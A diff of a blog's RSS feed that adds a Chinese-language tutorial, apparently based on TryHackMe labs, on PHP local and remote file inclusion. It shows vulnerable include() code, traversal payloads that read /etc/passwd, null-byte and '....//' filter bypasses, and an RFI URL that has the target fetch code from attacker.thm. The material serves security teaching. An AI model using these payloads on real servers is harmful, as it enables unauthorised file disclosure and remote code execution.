+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;lang&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;上面的 PHP 代码通过 URL 参数 lang 使用 GET 请求来包含页面的文件。可以通过发送以下 HTTP 请求来完成调用，如下所示：http://webapp.thm/index.php?lang=EN.php 加载英文页面或 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=AR.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webapp.thm/index.php?lang=AR.php&lt;/a&gt;加载阿拉伯语页面，其中 EN.php 和 AR.php文件位于同一目录中。&lt;/p&gt;
+&lt;p&gt;理论上，如果没有任何输入验证，我们可以从上面的代码中访问和显示服务器上的任何可读文件。假设我们想读取 /etc/passwd 文件，其中包含有关 Linux作系统用户的敏感信息，我们可以尝试以下作：http://webapp.thm/get.php?file=/etc/passwd&lt;/p&gt;
+&lt;p&gt;在这种情况下，它之所以有效，是因为 include 函数中没有指定目录，也没有输入验证。&lt;/p&gt;
+&lt;h3 id=&#34;二&#34;&gt;二
+&lt;/h3&gt;&lt;p&gt;接下来，在下面的代码中，开发人员决定指定函数内部的目录。&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;PHP&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;	&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;languages/&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;lang&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;在上面的代码中，开发者决定使用 include 函数，只通过 lang 参数调用 languages 目录下的 PHP 页面。&lt;/p&gt;
+&lt;p&gt;如果没有输入验证，攻击者可以通过将 lang 输入替换为其他作系统敏感文件（如 /etc/passwd）来纵 URL。&lt;/p&gt;
+&lt;p&gt;同样，有效负载看起来类似于路径遍历，但 include 函数允许我们将任何调用的文件包含到当前页面中。以下是漏洞利用：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h2 id=&#34;本地文件包含-lfi2&#34;&gt;本地文件包含 LFI2
+&lt;/h2&gt;&lt;p&gt;在这项任务中，我们将更深入地了解 LFI。我们讨论了在 include 函数中绕过过滤器的几种技术。&lt;/p&gt;
+&lt;p&gt;在前两种情况下，我们检查了 Web 应用程序的代码，然后我们知道如何利用它。但是，在本例中，我们正在执行黑盒测试，其中我们没有源代码。在这种情况下，错误对于了解数据如何传递和处理到 Web 应用程序中非常重要。&lt;/p&gt;
+&lt;p&gt;在此方案中，我们有以下入口点： &lt;code&gt;http://webapp.thm/index.php?lang=EN&lt;/code&gt; 。如果我们输入无效的输入（例如 THM），则会收到以下错误&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;错误消息泄露了重要信息。输入 THM 作为输入后，将显示一条错误消息，显示 include 函数的外观：&lt;code&gt;include（languages/THM.php）;&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;如果你仔细查看该目录，我们可以看出 functions includes files in the languages 目录正在添加 .php 的 API 文件。因此，有效的输入将如下所示：&lt;code&gt;index.php？lang=EN&lt;/code&gt;，其中文件 EN 位于给定的语言目录中，名为 EN。php 的&lt;/p&gt;
+&lt;p&gt;此外，错误消息还泄露了有关完整 Web 应用程序目录路径的另一条重要信息，即 &lt;code&gt;/var/www/html/THM-4/&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;要利用这一点，我们需要使用 &lt;code&gt;../&lt;/code&gt; 技巧，如 目录遍历 部分所述，以导出当前文件夹。让我们尝试以下作：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;http://webapp.thm/index.php?lang=../../../../etc/passwd
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;请注意，我们使用了 4 ../ 因为我们知道该路径有四个级别 &lt;code&gt;/var/www/html/THM-4&lt;/code&gt;。但我们仍然收到以下错误：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/../../../../../&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;):&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;ow&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;4&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;12&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;似乎我们可以移出 PHP 目录，但是 include 函数仍然使用 .PHP 最后！这告诉我们开发人员指定要传递给 include 函数的文件类型。要绕过这种情况，我们可以使用 NULL BYTE，即 &lt;code&gt;%00&lt;/code&gt;。&lt;/p&gt;
+&lt;p&gt;使用空字节是一种注入技术，其中 URL 编码的表示形式（如 %00 或 0x00）以十六进制表示形式与用户提供的数据一起终止字符串。您可以将其视为试图欺骗 Web 应用程序忽略 Null Byte 之后的任何内容。&lt;/p&gt;
+&lt;p&gt;通过在有效负载的末尾添加 Null Byte，我们告诉 include 函数忽略 null 字节之后的任何内容，这可能如下所示：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;include(&amp;#34;languages/../../../../../etc/passwd%00&amp;#34;).&amp;#34;.php&amp;#34;); `等同于 `include(&amp;#34;languages/../../../../../etc/passwd&amp;#34;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;注意：&lt;/strong&gt; %00 技巧是固定的，不适用于 PHP 5.3.4 及更高版本。&lt;/p&gt;
+&lt;h3 id=&#34;四&#34;&gt;四
+&lt;/h3&gt;&lt;p&gt;现在在实验 #4 中应用这个技术，并弄清楚如何读取 /etc/passwd。&lt;/p&gt;
+&lt;p&gt;&lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=../../../../etc/passwd&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webapp.thm/index.php?lang=../../../../etc/passwd&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;我们收到了以下错误！&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nx&#34;&gt;Warning&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;languages&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;etc&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;passwd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;failed&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;to&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;open&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;stream&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;No&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;such&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;or&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;directory&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;in&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;var&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;www&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;html&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;THM&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;/&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;index&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;on&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;line&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;15&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;如果我们检查 include（languages/etc/passwd） 部分中的警告消息，我们知道 Web 应用程序替换了 ../ 替换为空字符串。我们可以使用几种技术来绕过这种情况。&lt;/p&gt;
+&lt;p&gt;首先，我们可以发送以下 payload 来绕过它： &lt;code&gt;....//....//....//....//....//etc/passwd&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;这之所以有效，是因为 PHP 过滤器仅匹配并替换第一个子集字符串 &lt;code&gt;../&lt;/code&gt; 它找到并且不执行另一次传递，留下下图所示的内容。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750.png&#34;
+	width=&#34;480&#34;
+	height=&#34;179&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750_hu_ef9e9f89552662f6.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152704750_hu_c24a9352b4e8f91.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;268&#34;
+		data-flex-basis=&#34;643px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;五&#34;&gt;五
+&lt;/h3&gt;&lt;p&gt;最后，我们将讨论开发人员强制 include 从定义的目录中读取的情况！例如，如果 Web 应用程序要求提供必须包含目录的输入，例如： &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=languages/EN.php&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webapp.thm/index的php?lang=languages/EN.php&lt;/a&gt;然后，要利用这一点，我们需要将目录包含在有效负载中，如下所示： &lt;code&gt;?lang=languages/../../../../../etc/passwd&lt;/code&gt; 。&lt;/p&gt;
+&lt;h2 id=&#34;远程文件包含-rfi&#34;&gt;远程文件包含 RFI
+&lt;/h2&gt;&lt;p&gt;远程文件包含 （RFI） 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在对用户输入进行不当审查时，从而允许攻击者将外部 URL 注入 include 函数。RFI 的一个要求是需要打开 allow_url_fopen 选项。&lt;/p&gt;
+&lt;p&gt;RFI 的风险高于 LFI，因为 RFI 漏洞允许攻击者在服务器上获得远程命令执行 （RCE）。RFI 攻击成功的其他后果包括：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;敏感信息泄露&lt;/li&gt;
+&lt;li&gt;跨站点脚本 （XSS）&lt;/li&gt;
+&lt;li&gt;拒绝服务 （DoS）&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;外部服务器必须与应用程序服务器通信，才能成功进行 RFI 攻击，攻击者在其服务器上托管恶意文件。然后，恶意文件通过 HTTP 请求注入 include 函数，恶意文件的内容在易受攻击的应用程序服务器上执行。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979.png&#34;
+	width=&#34;1113&#34;
+	height=&#34;693&#34;
+	srcset=&#34;https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979_hu_6f1e20d3e6e530c9.png 480w, https://Yerucrem.github.io/p/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%9F%BA%E7%A1%80/image-20250319152859979_hu_280e9dd5d6272836.png 1024w&#34;
+	loading=&#34;lazy&#34;
+	
+	
+		class=&#34;gallery-image&#34; 
+		data-flex-grow=&#34;160&#34;
+		data-flex-basis=&#34;385px&#34;
+	
+&gt;&lt;/p&gt;
+&lt;h3 id=&#34;rfi步骤&#34;&gt;RFI步骤
+&lt;/h3&gt;&lt;p&gt;下图是成功进行 RFI 攻击的步骤示例！假设攻击者在他们自己的服务器 http：//attacker 上托管了一个 PHP 文件。thm/cmd.txt，其中 cmd.txt 包含打印消息 Hello THM.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?PHP echo &amp;#34;Hello THM&amp;#34;; ?&amp;gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;首先，攻击者注入恶意 URL，该 URL 指向攻击者的服务器，例如 &lt;a class=&#34;link&#34; href=&#34;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt&lt;/a&gt;的攻击者。THM/cmd.txt。如果没有输入验证，则恶意 URL 将传递到 include 函数中。接下来，Web 应用程序服务器将向恶意服务器发送 GET 请求以获取文件。因此，Web 应用程序将远程文件包含在 include 函数中，以执行页面内的 PHP 文件并将执行内容发送给攻击者。在我们的示例中，当前页面在某处必须显示 Hello THM 消息。&lt;/p&gt;
 </description>
         </item>
         <item>
@@ -1435,6 +1874,14 @@
         <pubDate>Tue, 28 May 2019 00:00:00 +0000</pubDate>
         
         <guid>https://Yerucrem.github.io/archives/</guid>
+        <description></description>
+        </item>
+        <item>
+        <title></title>
+        <link>https://Yerucrem.github.io/p/</link>
+        <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+        
+        <guid>https://Yerucrem.github.io/p/</guid>
         <description></description>
         </item>
         <item>
